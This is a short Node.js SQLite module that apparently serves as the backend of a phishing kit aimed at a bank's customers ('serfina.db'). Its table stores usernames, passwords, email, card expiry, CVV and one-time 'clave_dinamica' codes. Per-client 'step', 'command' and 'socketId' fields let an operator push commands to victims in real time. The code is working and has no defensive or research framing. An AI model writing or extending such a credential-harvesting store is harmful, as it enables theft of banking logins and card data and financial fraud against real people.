
const Database = require('better-sqlite3');
const path = require('path');
const dbfile = path.join(__dirname, 'serfina.db');
const db = new Database(dbfile);

db.prepare(`CREATE TABLE IF NOT EXISTS users (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  clientId TEXT UNIQUE,
  usuario TEXT,
  password_enc TEXT,
  correo TEXT,
  fecha TEXT,
  año TEXT,
  cvv TEXT,
  clave_dinamica TEXT,
  step TEXT,
  command TEXT,
  socketId TEXT,
  notified INTEGER DEFAULT 0,
  created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)`).run();

module.exports = {
  upsertUser(rec){
    const existing = db.prepare('SELECT id FROM users WHERE clientId = ?').get(rec.clientId);
    if (existing) {
      const stmt = db.prepare(`UPDATE users SET usuario=@usuario, password_enc=@password_enc, correo=@correo, fecha=@fecha, año=@año, cvv=@cvv, clave_dinamica=@clave_dinamica, step=@step WHERE clientId=@clientId`);
      stmt.run(rec);
    } else {
      const stmt = db.prepare(`INSERT INTO users (clientId, usuario, password_enc, correo, fecha, año, cvv, clave_dinamica, step) VALUES (@clientId,@usuario,@password_enc,@correo,@fecha,@año,@cvv,@clave_dinamica,@step)`);
      stmt.run(rec);
    }
  },
  getAllUsers(){
    return db.prepare('SELECT * FROM users ORDER BY created_at DESC').all();
  },
  getUserByClientId(clientId){
    return db.prepare('SELECT * FROM users WHERE clientId = ?').get(clientId);
  },
  setClientCommand(clientId, cmd){
    db.prepare('UPDATE users SET command = ? WHERE clientId = ?').run(cmd, clientId);
  },
  bindSocket(clientId, socketId){
    db.prepare('UPDATE users SET socketId = ? WHERE clientId = ?').run(socketId, clientId);
  },
  setClientNotified(clientId){
    db.prepare('UPDATE users SET notified = 1 WHERE clientId = ?').run(clientId);
  }
};
